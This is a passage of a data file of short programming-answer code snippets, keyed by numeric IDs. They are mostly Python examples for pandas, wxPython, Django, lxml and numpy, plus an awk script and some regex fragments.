</snippet></ROW><ROW><id>20419418</id><snippet>&gt;&gt;&gt; df = pd.DataFrame({'a':[1,2,3], 'b':list('xyz')})
&gt;&gt;&gt; df
   a  b
0  1  x
1  2  y
2  3  z
&gt;&gt;&gt; df.columns = df.iloc[0]
&gt;&gt;&gt; df
   1  x
0  1  x
1  2  y
2  3  z
</snippet></ROW><ROW><id>20419894</id><snippet>event.Skip()</snippet></ROW><ROW><id>20419894</id><snippet>import wx

class MainWindow(wx.Frame):
    def __init__(self, *args, **kwargs):
        wx.Frame.__init__(self, *args, **kwargs)

        self.panel = wx.Panel(self)
        self.text = wx.TextCtrl(self.panel)
        self.text.Bind(wx.EVT_KEY_DOWN, self.OnKeyDown)
        self.text.Bind(wx.EVT_KEY_UP, self.OnKeyUp)

        self.sizer = wx.BoxSizer()
        self.sizer.Add(self.text, 1)

        self.panel.SetSizerAndFit(self.sizer)  
        self.Show()

    def OnKeyDown(self, e):      
        code = e.GetKeyCode()
        if code == wx.WXK_ESCAPE:
            print("Escape")
        if code == wx.WXK_UP:
            print("Up")
        if code == wx.WXK_DOWN:
            print("Down")
        e.Skip()

    def OnKeyUp(self, e):
        code = e.GetKeyCode()
        if code == wx.WXK_RETURN:
            print("Return")
        e.Skip()


app = wx.App(False)
win = MainWindow(None)
app.MainLoop()
</snippet></ROW><ROW><id>20419971</id><snippet>import file1</snippet></ROW><ROW><id>20419971</id><snippet>file1.a</snippet></ROW><ROW><id>20420737</id><snippet>my_re = r"\{([0-9]*)\}\{[0-9]*\}(.*)"
</snippet></ROW><ROW><id>20420737</id><snippet>[]</snippet></ROW><ROW><id>20420852</id><snippet>difflib</snippet></ROW><ROW><id>20420852</id><snippet>&gt;&gt;&gt; from functools import partial
&gt;&gt;&gt; from difflib import SequenceMatcher
def func(x, y):
    s = SequenceMatcher(None, x, y)
    return s.find_longest_match(0, len(x), 0, len(y)).size
... 
for item in L1:
    f = partial(func, item)
    print max(L2, key=f)
...     
xy_b_c
z_d_e_y
</snippet></ROW><ROW><id>20421262</id><snippet>if</snippet></ROW><ROW><id>20421262</id><snippet>False</snippet></ROW><ROW><id>20421262</id><snippet>None</snippet></ROW><ROW><id>20421262</id><snippet>0</snippet></ROW><ROW><id>20421262</id><snippet>0.0</snippet></ROW><ROW><id>20421262</id><snippet>-0.0</snippet></ROW><ROW><id>20421262</id><snippet>__bool__</snippet></ROW><ROW><id>20421262</id><snippet>False</snippet></ROW><ROW><id>20421262</id><snippet>__nonzero__</snippet></ROW><ROW><id>20421262</id><snippet>False</snippet></ROW><ROW><id>20421262</id><snippet>0</snippet></ROW><ROW><id>20421262</id><snippet>__bool__</snippet></ROW><ROW><id>20421262</id><snippet>__nonzero__</snippet></ROW><ROW><id>20421262</id><snippet>__len__</snippet></ROW><ROW><id>20421262</id><snippet>False</snippet></ROW><ROW><id>20421262</id><snippet>True</snippet></ROW><ROW><id>20421262</id><snippet>x</snippet></ROW><ROW><id>20421262</id><snippet>True</snippet></ROW><ROW><id>20421262</id><snippet>False</snippet></ROW><ROW><id>20421262</id><snippet>if x</snippet></ROW><ROW><id>20421262</id><snippet>x</snippet></ROW><ROW><id>20421262</id><snippet>if x</snippet></ROW><ROW><id>20421262</id><snippet>x</snippet></ROW><ROW><id>20421262</id><snippet>True</snippet></ROW><ROW><id>20421262</id><snippet>if x is True</snippet></ROW><ROW><id>20421262</id><snippet>x</snippet></ROW><ROW><id>20421262</id><snippet>x</snippet></ROW><ROW><id>20421262</id><snippet>x is True</snippet></ROW><ROW><id>20421262</id><snippet>True</snippet></ROW><ROW><id>20421262</id><snippet>x</snippet></ROW><ROW><id>20421262</id><snippet>None</snippet></ROW><ROW><id>20421262</id><snippet>if x is not None</snippet></ROW><ROW><id>20421336</id><snippet>env</snippet></ROW><ROW><id>20421336</id><snippet>form_valid()</snippet></ROW><ROW><id>20421336</id><snippet>class EnvhostsCreate(CreateView):
    model = Capacity.models.Envhosts
    fields = ['hostname', 'count']
    template_name_suffix = '_create_form'

    def form_valid(self, form):
        form.instance.env = Envhosts.objects.get(pk=self.kwargs['envid'])
        return super(EnvhostsCreate, self).form_valid(form)
</snippet></ROW><ROW><id>20421502</id><snippet>[rev_enum.awk $] cat reverse_enumerate.awk
#!/bin/gawk -f

BEGIN{idx=1}
NF==2 {
    if(key!=$1){
        print_and_clear();
    }
    data[idx]=$0;
    idx++;
    key=$1;
}
function print_and_clear()
{
    n=length(data);
    for(i=1; i&lt;=n; i++){
        print data[i] " " n-i+1;
    }
    idx=1;
    delete data;
}
END{print_and_clear();}
[rev_enum.awk $] cat dummy_file
    A   ID1
    A   ID2
    A   ID3
    B   ID4
    B   ID5
    C   ID6
    C   ID7
    C   ID8
    C   ID9[rev_enum.awk $]
[rev_enum.awk $] ./reverse_enumerate.awk dummy_file
    A   ID1 3
    A   ID2 2
    A   ID3 1
    B   ID4 2
    B   ID5 1
    C   ID6 4
    C   ID7 3
    C   ID8 2
    C   ID9 1
[rev_enum.awk $]
</snippet></ROW><ROW><id>20421502</id><snippet>#!/bin/gawk -f 
BEGIN{idx=1}
NF==2{
    if($1 in data){
    data[$1]=data[$1]","$2;
    }else{
    order[idx++]=$1;
    data[$1]=$2;
    }    
}

END{
    n=length(order);
    for(i=1;i&lt;=n;i++){
        m=split(data[order[i]], temp,",");
    for(j=1;j&lt;=m;j++){
        print order[i] " " temp[j]" " m-j+1;
    }
    }
}
</snippet></ROW><ROW><id>20421535</id><snippet>find</snippet></ROW><ROW><id>20421535</id><snippet>xargs</snippet></ROW><ROW><id>20421535</id><snippet>md5sum</snippet></ROW><ROW><id>20422061</id><snippet>MyUser</snippet></ROW><ROW><id>20422061</id><snippet>class UserType(models.Model):
    type = ... # teacher, student, whatever

class MyUser(models.Model):
    name = ...
    username = ...
    user_type = models.ForeignKey('UserType',...

class TeacherProfile(models.Model):
    user = models.ForeignKey('MyUser',...
    user_type = models.ForeignKey('UserType',...
    gradebook = ...

class StudentProfile(models.Model):
    user = models.ForeignKey('MyUser',...
    user_type = models.ForeignKey('UserType',...
    homework = ...
</snippet></ROW><ROW><id>20422061</id><snippet>    def get_profile(self):
        if user_type_is_teacher():
            return TeacherProfile.objects.get(user=self, user_type=self.user_type)
</snippet></ROW><ROW><id>20422061</id><snippet>u</snippet></ROW><ROW><id>20422061</id><snippet>u.get_profile().homework
</snippet></ROW><ROW><id>20422317</id><snippet>from flask.ext.login import current_user

@app.route(...)
def main_route():
    if current_user.is_authenticated():
         return render_template("main_for_user.html")
    else:
         return render_template("main_for_anonymous.html")
</snippet></ROW><ROW><id>20422349</id><snippet>pandas.Series.replace()</snippet></ROW><ROW><id>20422349</id><snippet>df['v_6'] = df['v_6'].replace(-77, np.NaN)
</snippet></ROW><ROW><id>20422402</id><snippet>Django 1.6</snippet></ROW><ROW><id>20422508</id><snippet>item[xxx]</snippet></ROW><ROW><id>20422508</id><snippet>tx.execute('INSERT INTO book_updata ...)</snippet></ROW><ROW><id>20422508</id><snippet>item</snippet></ROW><ROW><id>20422657</id><snippet>++</snippet></ROW><ROW><id>20422657</id><snippet>+=</snippet></ROW><ROW><id>20422657</id><snippet>temp = ''
for item in instance:
    temp += item
</snippet></ROW><ROW><id>20422773</id><snippet>http://1.2.3.4/a/page_first/</snippet></ROW><ROW><id>20422773</id><snippet>&lt;img src="my_image.png"/&gt;</snippet></ROW><ROW><id>20422773</id><snippet>http://1.2.3.4/a/</snippet></ROW><ROW><id>20422773</id><snippet>http://1.2.3.4/a/my_image.png</snippet></ROW><ROW><id>20422773</id><snippet>http://1.2.3.4/a/page_first/my_image.png</snippet></ROW><ROW><id>20422773</id><snippet>/a/page_first/</snippet></ROW><ROW><id>20422773</id><snippet>page_first</snippet></ROW><ROW><id>20422773</id><snippet>http://www.example.com/some/path/here</snippet></ROW><ROW><id>20422773</id><snippet>dispatcher.connect('page','/a/:number_of_page/', controller=self, action='page_method')</snippet></ROW><ROW><id>20422773</id><snippet>http://1.2.3.4/a/page_first/</snippet></ROW><ROW><id>20422830</id><snippet>move_cards</snippet></ROW><ROW><id>20422830</id><snippet>Hand</snippet></ROW><ROW><id>20422830</id><snippet>Deck</snippet></ROW><ROW><id>20422830</id><snippet>Hand</snippet></ROW><ROW><id>20422830</id><snippet>Deck</snippet></ROW><ROW><id>20422830</id><snippet>Stack</snippet></ROW><ROW><id>20422830</id><snippet>class Stack:
"""represents a collection of cards"""
    def __init__(self):
        self.cards = []

    def __str__(self):
        res = []
        for card in self.cards:
            res.append(str(card))
        return '\n'.join(res)

    def pop_card(self):
        return self.cards.pop()

    def add_card(self):
        self.cards.append(card)

    def shuffle(self):
        random.shuffle(self.cards)

    def sort(self):
        self.cards.sort(key=attrgetter('suit', 'rank'))

    def move_cards(self, dest, num):
        for i in range(num):
            dest.add_card(self.pop_card())

class Deck(Stack):
"""represents a deck of playing cards"""
    def __init__(self):
        Stack.__init__(self)
        for suit in range(4):
            for rank in range(1, 14):
                card = Card(suit, rank)
                self.cards.append(card)

class Hand(Stack):
"""represents a hand of playing cards"""
    def __init__(self, label=''):
        Stack.__init__(self)
        self.label = label
</snippet></ROW><ROW><id>20422830</id><snippet>Hand</snippet></ROW><ROW><id>20422830</id><snippet>Deck</snippet></ROW><ROW><id>20422830</id><snippet>Stack.__init__(self)</snippet></ROW><ROW><id>20422830</id><snippet>self.cards</snippet></ROW><ROW><id>20423005</id><snippet>debug</snippet></ROW><ROW><id>20423005</id><snippet>app.logger.setLevel(logging.DEBUG)</snippet></ROW><ROW><id>20423097</id><snippet>&gt;&gt;&gt; lis = [[u'Apple', '', u'Apple Inc', u'Apple', u'shares ', u'Amazon', u'Amazon', u'Amazon', '', '', u'Apple', u'Kindle', u'iPad', u'Amazon', u'Amazon', '', u'Amazon', u'Kindle', u'Amazon', '', u'iPad', u'iPad', u'iPad', u'Kindle', u'Kindle', u'Nook', u' ', u'sales', '', '', u'Amazon', '', '', '', '', '', ''], [u'United Kingdom', ''], [u'LA']]
def solve(lis):
    for seq in lis:
        seen = set()
        yield [x for x in seq if x.strip() and x not in seen and not seen.add(x)]

&gt;&gt;&gt; list(solve(lis))
[[u'Apple', u'Apple Inc', u'shares ', u'Amazon', u'Kindle', u'iPad', u'Nook', u'sales'],
 [u'United Kingdom'],
 [u'LA']]
</snippet></ROW><ROW><id>20423097</id><snippet>x.strip()</snippet></ROW><ROW><id>20423097</id><snippet>if x</snippet></ROW><ROW><id>20423097</id><snippet>u' '</snippet></ROW><ROW><id>20423187</id><snippet># SOME DESCRIPTIVE TITLE.
# Copyright (C) YEAR ORGANIZATION
# FIRST AUTHOR &lt;EMAIL@ADDRESS&gt;, YEAR.
#
msgid ""
msgstr ""
"Project-Id-Version: PACKAGE VERSION\n"
"POT-Creation-Date: 2013-12-06 11:22\n"
"PO-Revision-Date: YEAR-MO-DA HO:MI+ZONE+Mitteleuropäische Zeit\n"
"Last-Translator: FULL NAME &lt;EMAIL@ADDRESS&gt;\n"
"Language-Team: LANGUAGE &lt;LL@li.org&gt;\n"
"MIME-Version: 1.0\n"
"Content-Type: text/plain; charset=CHARSET\n"
"Content-Transfer-Encoding: ENCODING\n"
"Generated-By: pygettext.py 1.5\n"
</snippet></ROW><ROW><id>20423187</id><snippet>Mitteleuropäische Zeit</snippet></ROW><ROW><id>20423187</id><snippet>pygettext.py</snippet></ROW><ROW><id>20423187</id><snippet>timestamp = time.strftime('%Y-%m-%d %H:%M-%Z')
</snippet></ROW><ROW><id>20423187</id><snippet>timestamp = time.strftime('%Y-%m-%d %H:%M', time.gmtime())
</snippet></ROW><ROW><id>20423293</id><snippet>[^,]
</snippet></ROW><ROW><id>20423293</id><snippet>[^,\s]
</snippet></ROW><ROW><id>20423293</id><snippet>[^,\s]+
</snippet></ROW><ROW><id>20423313</id><snippet>plain</snippet></ROW><ROW><id>20423313</id><snippet>chunk_size * 2</snippet></ROW><ROW><id>20423313</id><snippet>&gt;&gt;&gt; '%02x' % 256
'100'
&gt;&gt;&gt; unhexlify('%02x' % 256)
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
binascii.Error: Odd-length string
</snippet></ROW><ROW><id>20423313</id><snippet>plain</snippet></ROW><ROW><id>20423313</id><snippet>plain</snippet></ROW><ROW><id>20423313</id><snippet>mask = (1 &lt;&lt; (chunksize * 8)) - 1
plain &amp;= mask
</snippet></ROW><ROW><id>20423313</id><snippet>str.format()</snippet></ROW><ROW><id>20423313</id><snippet>%</snippet></ROW><ROW><id>20423313</id><snippet>unhexlify('{1:0{0}x}'.format(chunk_size * 2, plain))
</snippet></ROW><ROW><id>20423313</id><snippet>binascii.unhexlify</snippet></ROW><ROW><id>20423382</id><snippet>'proxyType': 'MANUAL' 
</snippet></ROW><ROW><id>20423382</id><snippet>'proxyType': ProxyType.MANUAL
</snippet></ROW><ROW><id>20423724</id><snippet>nonzero</snippet></ROW><ROW><id>20423724</id><snippet>nonZeroData = data[np.nonzero(data[time][1])]
</snippet></ROW><ROW><id>20423724</id><snippet>nonZeroYCount = np.count_nonzero(data[time][1][:, 1])
</snippet></ROW><ROW><id>20423944</id><snippet>+=</snippet></ROW><ROW><id>20423944</id><snippet>(a=1) &gt; 2
</snippet></ROW><ROW><id>20423944</id><snippet>if a = 1: # instead of ==
    pass
else:
    pass
</snippet></ROW><ROW><id>20423944</id><snippet>&gt;&gt;&gt; a = 1 
&gt;&gt;&gt; a = b = a+1
&gt;&gt;&gt; a
2
&gt;&gt;&gt; b
2
</snippet></ROW><ROW><id>20424115</id><snippet>groupby</snippet></ROW><ROW><id>20424115</id><snippet>import pandas as pd
index = [0,3,5,5]
dist = [1,1,1,3]
s = pd.Series(dist).groupby(index).min()
arr = np.zeros(6)
arr[s.index] = s.values
print arr
</snippet></ROW><ROW><id>20424254</id><snippet>filter()</snippet></ROW><ROW><id>20424254</id><snippet># test data
&gt;&gt;&gt; df1 = pd.DataFrame({'a':list('AAABB'), 'b':list('BBBAA'), 'c':range(5)})
&gt;&gt;&gt; df1
   a  b  c
0  A  B  0
1  A  B  1
2  A  B  2
3  B  A  3
4  B  A  4

&gt;&gt;&gt; df1.groupby(['a','b']).filter(lambda x: len(x) &gt; 2)
   a  b  c
0  A  B  0
1  A  B  1
2  A  B  2
</snippet></ROW><ROW><id>20424254</id><snippet>&gt;&gt;&gt; df1 = pd.DataFrame({'a':list('AAABB'), 'b':list('BBBAA'), 'c':range(5), 'd':range(5)})
&gt;&gt;&gt; df1
   a  b  c  d
0  A  B  0  0
1  A  B  1  1
2  A  B  2  2
3  B  A  3  3
4  B  A  4  4
&gt;&gt;&gt; df1.groupby(['a','b']).filter(lambda x: len(x) &gt; 2)
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
  File "C:\Python27\lib\site-packages\pandas\core\groupby.py", line 2094, in filter
    if res:
ValueError: The truth value of an array with more than one element is ambiguous. Use a.any() or a.all()
</snippet></ROW><ROW><id>20424254</id><snippet>&gt;&gt;&gt; df1.groupby(['a','b']).filter(lambda x: len(x['c']) &gt; 2)
   a  b  c  d
0  A  B  0  0
1  A  B  1  1
2  A  B  2  2
</snippet></ROW><ROW><id>20424254</id><snippet>transform()</snippet></ROW><ROW><id>20424254</id><snippet>&gt;&gt;&gt; df1[df1.groupby(['a','b'])['c'].transform(lambda x: len(x) &gt; 2).astype(bool)]
   a  b  c  d
0  A  B  0  0
1  A  B  1  1
2  A  B  2  2
</snippet></ROW><ROW><id>20424283</id><snippet>PYTHONPATH=/etc</snippet></ROW><ROW><id>20424283</id><snippet>/etc</snippet></ROW><ROW><id>20424283</id><snippet>echo</snippet></ROW><ROW><id>20424283</id><snippet>echo $PYTHONPATH</snippet></ROW><ROW><id>20424283</id><snippet>env</snippet></ROW><ROW><id>20424283</id><snippet>grep</snippet></ROW><ROW><id>20424283</id><snippet>env | grep PYTHONPATH</snippet></ROW><ROW><id>20424721</id><snippet>re.findall</snippet></ROW><ROW><id>20424721</id><snippet>pattern</snippet></ROW><ROW><id>20424721</id><snippet>findall</snippet></ROW><ROW><id>20424721</id><snippet>&gt;&gt;&gt; import re
&gt;&gt;&gt; re.findall('abc', 'abc')
['abc']
&gt;&gt;&gt; re.findall('a(b)c', 'abc')
['b']
&gt;&gt;&gt; re.findall('a(b)(c)', 'abc')
[('b', 'c')]
</snippet></ROW><ROW><id>20424721</id><snippet>&gt;&gt;&gt; re.findall('a(?:b)c', 'abc')
['abc']
</snippet></ROW><ROW><id>20424752</id><snippet>os.mkdir</snippet></ROW><ROW><id>20424752</id><snippet>sg_folds</snippet></ROW><ROW><id>20424752</id><snippet>None</snippet></ROW><ROW><id>20424752</id><snippet>sg_folds = name+"_"+str(space)
os.mkdir(sg_folds)
shutil.copy(input_file, sg_folds)
</snippet></ROW><ROW><id>20424779</id><snippet>class s:
    i = []
</snippet></ROW><ROW><id>20424779</id><snippet>class S {
    static List i = new ...
    }
</snippet></ROW><ROW><id>20424779</id><snippet>class s:
    def __init__(self):
        self.i = []
</snippet></ROW><ROW><id>20424779</id><snippet>__init__</snippet></ROW><ROW><id>20425526</id><snippet>&gt;&gt;&gt; doc = """&lt;TABLE&gt;
... &lt;TR&gt;
...     &lt;TD&gt;&lt;P&gt;Name&lt;/P&gt;&lt;/TD&gt;
...     &lt;TD&gt;&lt;P&gt;Fees&lt;/P&gt;&lt;/TD&gt;
...     &lt;TD&gt;&lt;P&gt;Awards&lt;/P&gt;&lt;/TD&gt;
...     &lt;TD&gt;&lt;P&gt;Total&lt;/P&gt;&lt;/TD&gt;
... &lt;/TR&gt;
... &lt;TR&gt;
...     &lt;TD&gt;&lt;P&gt;Tony&lt;/P&gt;&lt;/TD&gt;
...     &lt;TD &gt;7,800&lt;/TD&gt;
...     &lt;TD &gt;7&lt;/TD&gt;
...     &lt;TD&gt;15,400&lt;/TD&gt;
... &lt;/TR&gt;
... &lt;TR&gt;
...     &lt;TD&gt;&lt;P&gt;Paul&lt;/FONT&gt;&lt;/P&gt;&lt;/TD&gt;
...     &lt;TD &gt;7,800&lt;/TD&gt;
...     &lt;TD &gt;7&lt;/TD&gt;
...     &lt;TD&gt;15,400&lt;/TD&gt;
... &lt;/TR&gt;
... &lt;TR&gt;
...     &lt;TD&gt;&lt;P&gt;Richard&lt;/P&gt;&lt;/TD&gt;
...     &lt;TD &gt;7,800&lt;/TD&gt;
...     &lt;TD &gt;7&lt;/TD&gt;
...     &lt;TD&gt;15,400&lt;/TD&gt;
... &lt;/TR&gt;
... 
... &lt;/TR&gt;
... &lt;/TABLE&gt;"""
&gt;&gt;&gt; import lxml.html
&gt;&gt;&gt; root = lxml.html.fromstring(doc)
&gt;&gt;&gt; root.xpath('//tr/td//text()')
['Name', 'Fees', 'Awards', 'Total', 'Tony', '7,800', '7', '15,400', 'Paul', '7,800', '7', '15,400', 'Richard', '7,800', '7', '15,400']
&gt;&gt;&gt; 
</snippet></ROW><ROW><id>20425526</id><snippet>.</snippet></ROW><ROW><id>20425526</id><snippet>&gt;&gt;&gt; doc = """&lt;TABLE&gt;
... &lt;TR&gt;
...     &lt;TD&gt;&lt;P&gt;Name&lt;/P&gt;&lt;/TD&gt;
...     &lt;TD&gt;&lt;P&gt;Fees&lt;/P&gt;&lt;/TD&gt;
...     &lt;TD&gt;&lt;P&gt;Awards&lt;/P&gt;&lt;/TD&gt;
...     &lt;TD&gt;&lt;P&gt;Total&lt;/P&gt;&lt;/TD&gt;
... &lt;/TR&gt;
... &lt;TR&gt;
...     &lt;TD&gt;&lt;P&gt;Tony&lt;/P&gt;&lt;/TD&gt;
...     &lt;TD &gt;7,800&lt;/TD&gt;
...     &lt;TD &gt;7&lt;/TD&gt;
...     &lt;TD&gt;15,400&lt;/TD&gt;
... &lt;/TR&gt;
... &lt;TR&gt;
...     &lt;TD&gt;&lt;P&gt;Paul&lt;/FONT&gt;&lt;/P&gt;&lt;/TD&gt;
...     &lt;TD &gt;7,800&lt;/TD&gt;
...     &lt;TD &gt;7&lt;/TD&gt;
...     &lt;TD&gt;15,400&lt;/TD&gt;
... &lt;/TR&gt;
... &lt;TR&gt;
...     &lt;TD&gt;&lt;P&gt;Richard&lt;/P&gt;&lt;/TD&gt;
...     &lt;TD &gt;7,800&lt;/TD&gt;
...     &lt;TD &gt;7&lt;/TD&gt;
...     &lt;TD&gt;15,400&lt;/TD&gt;
... &lt;/TR&gt;
... 
... &lt;/TR&gt;
... &lt;/TABLE&gt;
... &lt;TABLE&gt;
... &lt;TR&gt;
...     &lt;TD&gt;&lt;P&gt;Name&lt;/P&gt;&lt;/TD&gt;
...     &lt;TD&gt;&lt;P&gt;Fees&lt;/P&gt;&lt;/TD&gt;
...     &lt;TD&gt;&lt;P&gt;Awards&lt;/P&gt;&lt;/TD&gt;
...     &lt;TD&gt;&lt;P&gt;Total&lt;/P&gt;&lt;/TD&gt;
... &lt;/TR&gt;
... &lt;TR&gt;
...     &lt;TD&gt;&lt;P&gt;Tony&lt;/P&gt;&lt;/TD&gt;
...     &lt;TD &gt;7,800&lt;/TD&gt;
...     &lt;TD &gt;7&lt;/TD&gt;
...     &lt;TD&gt;15,400&lt;/TD&gt;
... &lt;/TR&gt;
... &lt;TR&gt;
...     &lt;TD&gt;&lt;P&gt;Paul&lt;/FONT&gt;&lt;/P&gt;&lt;/TD&gt;
...     &lt;TD &gt;7,800&lt;/TD&gt;
...     &lt;TD &gt;7&lt;/TD&gt;
...     &lt;TD&gt;15,400&lt;/TD&gt;
... &lt;/TR&gt;
... &lt;TR&gt;
...     &lt;TD&gt;&lt;P&gt;Richard&lt;/P&gt;&lt;/TD&gt;
...     &lt;TD &gt;7,800&lt;/TD&gt;
...     &lt;TD &gt;7&lt;/TD&gt;
...     &lt;TD&gt;15,400&lt;/TD&gt;
... &lt;/TR&gt;
... 
... &lt;/TR&gt;
... &lt;/TABLE&gt;"""
&gt;&gt;&gt; import lxml.html
&gt;&gt;&gt; root = lxml.html.fromstring(doc)
&gt;&gt;&gt; root.xpath('//tr/td//text()')
['Name', 'Fees', 'Awards', 'Total', 'Tony', '7,800', '7', '15,400', 'Paul', '7,800', '7', '15,400', 'Richard', '7,800', '7', '15,400', 'Name', 'Fees', 'Awards', 'Total', 'Tony', '7,800', '7', '15,400', 'Paul', '7,800', '7', '15,400', 'Richard', '7,800', '7', '15,400']
&gt;&gt;&gt; for tbl in root.xpath('//table'):
...     elements = tbl.xpath('.//tr/td//text()')
...     print elements
... 
['Name', 'Fees', 'Awards', 'Total', 'Tony', '7,800', '7', '15,400', 'Paul', '7,800', '7', '15,400', 'Richard', '7,800', '7', '15,400']
['Name', 'Fees', 'Awards', 'Total', 'Tony', '7,800', '7', '15,400', 'Paul', '7,800', '7', '15,400', 'Richard', '7,800', '7', '15,400']
&gt;&gt;&gt; 
</snippet></ROW><ROW><id>20425811</id><snippet>import subprocess
file_ = open("ouput.txt", "w")
subprocess.Popen("ls", stdout=file_)
</snippet></ROW><ROW><id>20425811</id><snippet>import subprocess

file_ = open("ouput.txt", "w")
subprocess.Popen(["host", ipAddress], stdout=file_)
</snippet></ROW><ROW><id>20425816</id><snippet>pandas.DataFrame.merge</snippet></ROW><ROW><id>20425816</id><snippet>pd.merge(df, te, left_index=True, right_on='Number_test')
</snippet></ROW><ROW><id>20425816</id><snippet>pd.merge(df.reset_index(), te, left_on='index', right_on='Number_test')
</snippet></ROW><ROW><id>20425848</id><snippet>type</snippet></ROW><ROW><id>20425848</id><snippet>bigclass = type('bigclass', (hello, bye), {})
</snippet></ROW><ROW><id>20426030</id><snippet>pcolor</snippet></ROW><ROW><id>20426030</id><snippet>from numpy import *
from matplotlib.pyplot import *

Nx = 3
Ny = 3

# This is just creating some sample data
xx, yy = meshgrid(range(Nx), range(Ny))
zz = xx + yy
data = vstack([c.flatten() for c in [xx, yy, zz]]).T

# This is reversing the above operation to get x y and z suitable for pcolor
x, y, z = [data[:, i].reshape(Nx, Ny) for i in range(3)]

# Now you can plot
pcolor(x, y, z)
colorbar()
</snippet></ROW><ROW><id>20426234</id><snippet>train = np.empty([7049,9246])
row = 0
for line in open("data/training_nohead.csv")
    train[row] = np.fromstring(line, sep=",")
    row += 1
</snippet></ROW><ROW><id>20426234</id><snippet>\n</snippet></ROW><ROW><id>20426234</id><snippet>num_rows = 0
for line in open("data/training_nohead.csv")
    num_rows += 1
</snippet></ROW><ROW><id>20426234</id><snippet>num_rows = 0
max_cols = 0
for line in open("data/training_nohead.csv")
    num_rows += 1
    tmp = line.split(",")
    if len(tmp) &gt; max_cols:
        max_cols = len(tmp)
</snippet></ROW><ROW><id>20426339</id><snippet>def key_at_depth(dct, dpt):
     if dpt &gt; 0:
         return [ key for subdct in dct.itervalues() for key in key_at_depth(subdct, dpt-1)  ]
     else:
         return dct.keys()


dict_o_dicts = {'a': {1:'bob', 2: 'fred', 3: 'henry'}, 'b': {2:'fred',3: 'henry', 4: 'pascale'} }

key_at_depth(dict_o_dicts, 0)

Out[69]: ['a', 'b']

key_at_depth(dict_o_dicts, 1)

Out[70]: [1, 2, 3, 2, 3, 4]
</snippet></ROW><ROW><id>20426381</id><snippet>l += n * [v]
</snippet></ROW><ROW><id>20426493</id><snippet>from rest_framework.renderers import JSONRenderer

class EmberJSONRenderer(JSONRenderer):

    def render(self, data, accepted_media_type=None, renderer_context=None):
        data = {'element': data}
        return super(EmberJSONRenderer, self).render(data, accepted_media_type, renderer_context)
</snippet></ROW><ROW><id>20426493</id><snippet>class MyView(APIView):
    renderer_classes = (EmberJSONRenderer, )
    # ...
</snippet></ROW><ROW><id>20426497</id><snippet>.add()</snippet></ROW><ROW><id>20426497</id><snippet>Sankey()</snippet></ROW><ROW><id>20426497</id><snippet>sankey = Sankey(scale=1.0/69,patchlabel="Gas balance",format='%.1f',margin=0.15,
                flows=ImportFlows, labels=ImportLabels, 
                orientations=ImportOrientation, label='Imports',fc='#00AF00')
sankey.add(flows=v,labels=l,orientations=d, label='Second',fc='#008000', prior=0,
           connect=(3, 0))
</snippet></ROW><ROW><id>20426715</id><snippet>data = [{'name':'a', 'n':0}, {'name':'b', 'n':0}, {'name':'c', 'n':0}, {'name':'d', 'n':0}...]
button_names = ['a','b','c','d',...]
button_lab = ['A','B','C','D',...]
N = len(button_names)
g = wx.GridSizer(math.ceil(N/4),4,0,0)
name_to_index = {} # &lt;-------
button_map = {}    # &lt;-------
for i in range(0, N-1):
    b = wx.Button(self, wx.ID_ANY, name=button_names[i], label=button_lab[i])
    name_to_index[button_names[i]] = i # &lt;-------
    button_map[button_map[i]] = b      # &lt;-------
    b.Bind(wx.EVT_BUTTON, self.OnClick)
    g.Add(b, 1, wx_ALL, 5)
</snippet></ROW><ROW><id>20426715</id><snippet>def OnClick(self,event):
    button = event.GetEventObject()
    d = button.GetName()
    data[name_to_index[d]]['n'] += 1
    #    ^^^^^^^^^^^^^^^^
</snippet></ROW><ROW><id>20426903</id><snippet>python manage.py makemessages -a
</snippet></ROW><ROW><id>20426903</id><snippet>python manage.py compilemessages</snippet></ROW><ROW><id>20426903</id><snippet>makemessages</snippet></ROW><ROW><id>20426903</id><snippet>compilemessages</snippet></ROW><ROW><id>20427008</id><snippet>def my_func_vec(a, b):
    a = np.array(a, copy=False, ndmin=2)
    b = np.array(b, copy=False, ndmin=2)
    a = a[..., np.newaxis, :]
    b = b[..., np.newaxis, :, :]
    distance = np.sqrt(np.sum((a[..., 1:] - b[..., 1:])**2, axis=-1))
    rate = np.exp(-2*distance / loclength)
    mask = a[..., 0] &lt; b[..., 0]
    rate[mask] *= np.exp((a[..., 0] - b[..., 0])[mask] / kT)
    mask = rate &lt;= cutoff
    rate[mask] = 0
    return rate
</snippet></ROW><ROW><id>20427008</id><snippet>loclength = 1
kT = 1
cutoff = 0.25
a = np.random.rand(3, 5)
b = np.random.rand(4, 5)
</snippet></ROW><ROW><id>20427008</id><snippet>&gt;&gt;&gt; my_func_vec(a, b)
array([[ 0.34220076,  0.        ,  0.25392478,  0.        ],
       [ 0.        ,  0.        ,  0.        ,  0.        ],
       [ 0.        ,  0.25953994,  0.        ,  0.        ]])
</snippet></ROW><ROW><id>20427008</id><snippet>&gt;&gt;&gt; out = np.empty((3, 4))
&gt;&gt;&gt; for r, j in enumerate(a):
...     for c, k in enumerate(b):
...         out[r, c] = my_func(j, k)
... 
&gt;&gt;&gt; out
array([[ 0.34220076,  0.        ,  0.25392478,  0.        ],
       [ 0.        ,  0.        ,  0.        ,  0.        ],
       [ 0.        ,  0.25953994,  0.        ,  0.        ]])
</snippet></ROW><ROW><id>20427044</id><snippet>imap</snippet></ROW><ROW><id>20427044</id><snippet>&gt;&gt;&gt; map(lamda x: x, xrange(0, 2))
[0, 1]

&gt;&gt;&gt; from itertools import imap
&gt;&gt;&gt; imap(lamda x: x, xrange(0, 2))
&lt;generator object at 0xsome-address&gt;

# Consume the resulting iterator
&gt;&gt;&gt; list(imap(lamda x: x, xrange(0, 2)))
[0, 1]
</snippet></ROW><ROW><id>20427044</id><snippet>imap</snippet></ROW><ROW><id>20427044</id><snippet>multiprocessing</snippet></ROW><ROW><id>20427044</id><snippet>gevent</snippet></ROW><ROW><id>20427066</id><snippet>&gt;&gt;&gt; data = {'string': username + '|' + password}
&gt;&gt;&gt; r = requests.post(url, data=data)
</snippet></ROW><ROW><id>20427237</id><snippet>class</snippet></ROW><ROW><id>20427237</id><snippet>t = soup.findAll('table', {'class': 'data'})
</snippet></ROW><ROW><id>20427237</id><snippet>select</snippet></ROW><ROW><id>20427237</id><snippet>t = css_soup.select("table.data")
